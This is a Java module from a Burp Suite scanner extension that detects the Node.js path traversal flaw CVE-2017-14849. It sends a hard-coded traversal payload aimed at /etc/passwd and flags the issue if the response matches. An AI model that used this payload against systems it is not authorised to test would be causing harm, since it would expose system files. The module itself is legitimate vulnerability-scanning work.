package burp.j2ee.issues.impl;

import burp.CustomHttpRequestResponse;
import static burp.HTTPMatcher.isEtcPasswdFile;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.LinkedHashSet;
import java.util.List;

/**
 *
 * Test for NodeJS Path Traversal
 *
 * Reference:
 * https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/
 *
 * CVE-2017-14849
 *
 */
public class NodeJSPathTraversal implements IModule {

    // List of host and port system already tested
    private static LinkedHashSet hs = new LinkedHashSet();

    private static final String TITLE = "NodeJS Path Traversal";
    private static final String DESCRIPTION = "J2EEscan identified a vulnerable installation"
            + " of NodeJS. Node.js version 8.5.0 included a change which caused a security vulnerability "
            + "in the checks on paths made by some community modules. As a result, an attacker may be able "
            + "to access file system paths other than those intended.<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "https://nodejs.org/en/blog/vulnerability/september-2017-path-validation/<br />"
            + "https://security.tencent.com/index.php/blog/msg/121";

    private static final String REMEDY = "Update the software with the last security patches";
    private static final String NODEJS_TRAVERSAL = "../../../j/../../../../etc/passwd";

    private PrintWriter stderr;

    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        List<IScanIssue> issues = new ArrayList<>();

        IExtensionHelpers helpers = callbacks.getHelpers();
        stderr = new PrintWriter(callbacks.getStderr(), true);

        IRequestInfo reqInfo = helpers.analyzeRequest(baseRequestResponse);

        URL currentUrl = reqInfo.getUrl();
        String host = currentUrl.getHost();
        int port = currentUrl.getPort();

        String system = host.concat(Integer.toString(port));

        String protocol = currentUrl.getProtocol();
        Boolean isSSL = (protocol.equals("https"));

        // skip if the NodeJS has not been found on the system
//            if (!IssuesHandler.isvulnerabilityFound(callbacks,
//                    "NodeJS detected",
//                    protocol,
//                    host)) {
//                return issues;
//
//            }

        String currentPath = currentUrl.getFile();
        
        URL urlToTest;

        try {

            if (currentPath.endsWith(".js")) {

                String fileName = currentPath.substring(currentPath.lastIndexOf('/') + 1, currentPath.length());
                urlToTest = new URL(protocol, currentUrl.getHost(), currentUrl.getPort(), currentPath.replace(fileName, NODEJS_TRAVERSAL));
                byte[] nodejstest = helpers.buildHttpRequest(urlToTest);

                byte[] response = callbacks.makeHttpRequest(currentUrl.getHost(),
                        currentUrl.getPort(), isSSL, nodejstest);

                if (isEtcPasswdFile(response, helpers)) {

                    callbacks.addScanIssue(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            urlToTest,
                            new CustomHttpRequestResponse(nodejstest, response, baseRequestResponse.getHttpService()),
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.Medium,
                            Confidence.Certain
                    ));

                }

            }

        } catch (MalformedURLException ex) {
            stderr.print("Exception while creating url " + ex);
        }

        return issues;

    }
}
